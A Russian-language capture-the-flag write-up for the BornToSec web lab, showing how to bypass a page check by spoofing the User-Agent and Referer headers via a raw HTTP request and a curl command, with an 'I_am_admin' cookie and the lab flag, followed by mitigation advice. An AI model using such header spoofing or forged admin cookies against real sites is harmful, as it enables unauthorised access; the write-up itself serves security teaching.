Нажми на значение в конце страницы - © BornToSec
Тем самым мы зайдём по адресу http://192.168.56.108/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c

Если происследовать страницу, то найдём текст, где можно найти подсказку. 

В другой строке предлагается использовать браузер с учетными данными ft_bornToSec. 
https://en.wikipedia.org/wiki/User_agent
Заменим реферера на "https://www.nsa.gov/". 
Обычно реферер указывает, откуда вы перешли на другой веб-сайт (в данном случае - с веб-сайта NSA).
https://en.wikipedia.org/wiki/Referer_spoofing

Здесь, чтобы получить флаг, сайт должен определить, что мы пришли с сайта https://www.nsa.gov/. Все, что нам нужно было сделать, это подменить(spoof) реферера в заголовках.

Итак, мы отправляем эти http-заголовки:

GET /index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c HTTP/1.1
Host: 192.168.0.30
User-Agent: ft_bornToSec
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://www.nsa.gov/
Connection: keep-alive
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0, no-cache
Pragma: no-cache


Мы можем воспользоваться функцией curl и сохранить страницу в flag01.html, где его откроем и увидим флаг.


Флаг -А Укажите  User-Agent для отправки на HTTP-сервер. 
Флаг -е Отправляет информацию о странице реферера на HTTP-сервер.
Вход идёт из "https://www.nsa.gov/" в http://192.168.56.108 через браузер ft_bornToSec"

➜  ~ curl -A "ft_bornToSec" -e "https://www.nsa.gov/" http://192.168.56.108/\?page\=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c > flag01.html

The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

Почему это опасно?
* Это может позволить пользователю с недопустимыми учетными данными получить доступ к запрещенной странице.

* Проверка реферера может предотвратить множественные проблемы безопасности, такие как RFI (включение удаленного файла) или CSRF (подделка межсайтовых запросов).

Как защититься?

* Проверить заголовки запросов на стороне сервера

* Надо создать правильную страницу входа в систему 

* Можно добавить токен и пароль для входа в параметрах запроса.

* Можно создать сеанс удаленного рабочего стола для входа администратора.





glossary:

curl
       -A, --user-agent <name>
              (HTTP) Specify the User-Agent string to send to the HTTP server.
              To  encode blanks in the string, surround the string with single
              quote marks. This can also be set with the _-_H_,  _-_-_h_e_a_d_e_r  option
              of course.

              If this option is used several times, the last one will be used.

       -e, --referer <URL>
              (HTTP) Sends the "Referrer Page" information to the HTTP server.
              This can also be set with the _-_H_, _-_-_h_e_a_d_e_r flag of course.  When
              used  with  _-_L_,  _-_-_l_o_c_a_t_i_o_n  you  can  append ";auto" to the _-_e_,
              _-_-_r_e_f_e_r_e_r URL to make curl automatically set  the  previous  URL
              when  it  follows  a Location: header. The ";auto" string can be
              used alone, even if you don't set an initial _-_e_, _-_-_r_e_f_e_r_e_r.

              If this option is used several times, the last one will be used.

              See also _-_A_, _-_-_u_s_e_r_-_a_g_e_n_t and _-_H_, _-_-_h_e_a_d_e_r.